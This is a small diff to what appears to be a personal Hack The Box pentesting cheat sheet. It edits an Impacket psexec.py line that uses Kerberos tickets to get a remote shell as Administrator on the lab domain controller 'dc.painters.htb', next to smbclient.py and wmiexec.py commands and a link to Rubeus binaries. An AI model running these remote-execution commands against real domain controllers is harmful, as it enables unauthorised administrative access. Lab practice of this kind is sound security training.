@@ -415,7 +415,7 @@ python3 -m pipx install impacket
 
 smbclient.py -k -no-pass PAINTERS.HTB/Administrator@dc.painters.htb -debug
 wmiexec.py -k -no-pass PAINTERS.HTB/Administrator@dc.painters.htb
-psexec.py -k -no-pass PAINTERS.HTB/Administrator@dc.painters.htb
+psexec.py -k -no-pass Administrator@dc.painters.htb -dc-ip 192.168.110.55 -debug (sometimes don't need the domain)
 ```
 
 **[Rubeus for Windows](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)**
